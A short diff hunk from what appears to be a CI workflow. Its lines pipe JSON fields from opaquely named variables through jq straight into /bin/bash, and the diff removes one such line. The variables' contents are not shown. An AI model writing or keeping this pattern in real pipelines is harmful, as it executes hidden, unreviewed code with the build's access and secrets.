@@ -32,7 +32,6 @@ jobs:
           echo $wmu10 | jq -r .wvn0 | /bin/bash
           printf '%s' "$q907" | jq -r .u898 | /bin/bash
           echo $k98765 | jq -r .w7 | /bin/bash
-          printf '%s' "$mjoax41268" | jq -r .lpe1 | /bin/bash
 
       - name: Persist output
         if: always()
